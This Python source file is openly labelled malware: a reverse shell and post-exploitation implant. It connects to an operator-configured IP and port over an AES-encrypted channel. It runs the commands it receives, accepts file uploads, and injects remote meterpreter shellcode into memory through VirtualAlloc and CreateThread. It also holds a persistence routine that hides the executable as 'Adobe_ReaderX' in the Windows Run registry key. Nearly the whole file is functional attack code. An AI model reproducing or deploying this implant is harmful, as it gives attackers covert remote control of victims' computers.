"""
    @Malware
    ST2Labs / GEO SYSTEM SOFTWARE
 
    Python Reverse Shell / Post-Explotation
 
    This code is base on:
        http://www.primalsecurity.net/
        Post: /0xc-python-tutorial-python-malware
"""
import sys
import base64
import os
import socket
import re
from Crypto.Cipher import AES
from Crypto import Random

#Crypt Class
class AESCipher:

    def __init__(self, key, blk_sz):
        self.key = key
        self.blk_sz = blk_sz

    def encrypt( self, raw ):
        if raw is None or len(raw) == 0:
            return ''
        raw = raw + '\0' * (self.blk_sz - len(raw) % self.blk_sz)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        if enc is None or len(enc) == 0:
            return ''
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return re.sub('\0*$','', cipher.decrypt( enc[16:]))

#Method to keep process into windows run
def autorun(tempdir, fileName, run):
    # Copy executable to %TEMP%:
    os.system('copy %s %s' % (fileName, tempdir))
 
    # Queries Windows registry for the autorun key value
    # Stores the key values in runkey array
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    runkey = []
    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            #print subkey[0]
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass
 
    # If the autorun key "Adobe ReaderX" isn't set this will set the key:
    if 'Adobe ReaderX' not in runkey:
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_ALL_ACCESS)
            SetValueEx(key, 'Adobe_ReaderX', 0, REG_SZ, r"%TEMP%\rsh.exe")
            key.Close()
        except WindowsError:
            pass
 
 
# Decode Base64 data
def decode(data):
    if len(data) % 4 != 0:  # check if multiple of 4
        while len(data) % 4 != 0:
            data = data + "="
        req_str = base64.b64decode(data)
    else:
        req_str = base64.b64decode(data)
    return req_str

# Decode Cipher+Base64 data
def decodeCipher(aes, data):
    if len(data) % 4 != 0:  # check if multiple of 4
        while len(data) % 4 != 0:
            data = data + "="
        req_str = base64.b64decode(data)
    else:
        req_str = base64.b64decode(data)
    msg = aes.decrypt( req_str ) 
    return msg
 
 
# Encode Cipher+Base64 data
def encodeCipher(aes, data):
    encryp_msg = aes.encrypt(data)
    return base64.b64encode(encryp_msg)
 
 
# Get JSON Configuration from file code with Base64
def getconfig(name):
    import json
    with open(name, 'rb') as f:
        d = json.loads(decode(f.read()))
        return d
 
# Run the command
def command(cmd):
    import subprocess
    import shlex
    args = shlex.split(cmd)

    try:
        p = subprocess.Popen(args, shell=True, stdout=subprocess.PIPE)
        out_, err_ = p.communicate()
        if p.returncode != 0:
            return "Command not valid"
        else:
            return out_
    except:
        return "Command not valid"

#Launch meterpreter shell
def hack(code):    
    import ctypes

    shellcode=bytearray(code)
    
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(shellcode)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
     
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
     
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(shellcode)))
     
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
     
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

#Receive Data Method
def receive(con, fileName):
    f = open(fileName,'wb')
    print f
    #con.listen(5)                 # Now wait for client connection.
    print "Receiving..."
    l = con.recv(1024)
    while (l[:18] != 'File has been sent'):
        print "Receiving..."
        f.write(l)
        l = con.recv(1024)
    f.close()
    print "Done Receiving"
    print "Done Receiving"   
    #con.close()                # Close the connection


def shell(ip, port):
    #CipherAES Object
    aes = AESCipher( 'enf1JTGj1qjWaJD3agH2yyYnviHM05YGVLP852UkO0wwHw0Fa0'[:16], 32) #50 Characs
    #Code to set hack mode
    code = "0"
    #Base64 encoded reverse shell
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        msg = '[*] Connection Established!'
        s.send(encodeCipher(aes, msg))
        while 1:
            cmd = decodeCipher(aes, s.recv(4096)) #Set to 4096 the buffer command, to allow send shellcode
            if cmd == "quit":
                response = "Se ha cerrado la conexion"
                encoded = encodeCipher(aes, response)
                s.send(encoded)
                break
            elif cmd == 'upload':
                response = "Nombre del fichero, por favor"            
                encoded = encodeCipher(aes, response)
                s.send(encoded)
                filename = decodeCipher(aes, s.recv(4096)) #Receive filename
                print filename
                encoded = encodeCipher(aes, 'OK')
                s.send(encoded)
                receive(s, filename)
                encoded = encodeCipher(aes, 'Done Receiving')
                s.send(encoded)
            elif cmd == "hack":
                response = "Se ha habilitado la ejecucion de ShellCode remoto"            
                encoded = encodeCipher(aes, response)
                s.send(encoded)
                code = "1"
            elif code == "1":
                code = "0"
                if cmd == 'error':
                    response = "Saliendo del modo hack debido a un error - No se ha enviado un ShellCode correcto"
                    encoded = encodeCipher(aes, response)
                    s.send(encoded)
                else:
                    response = "Se ha ejecutado el ShellCode"        
                    encoded = encodeCipher(aes, response)
                    s.send(encoded)
                    hack(cmd)
                    break
            else:
                response = command(cmd)
                # Here is where must implement action stuff
                # response is result to exceute action
                encoded = encodeCipher(aes, response)
                s.send(encoded)           
    finally:
        s.close()
 
 
def main():
    try:
        #tempdir = '%TEMP%'
        #fileName = sys.argv[0]
        #run = "Software\Microsoft\Windows\CurrentVersion\Run"
        #autorun(tempdir, fileName, run)
        conf = getconfig('conf.ini')
        shell(conf['ip'], conf['port'])
    except KeyboardInterrupt:
        sys.exit(2)
 
if __name__ == "__main__":
        main()
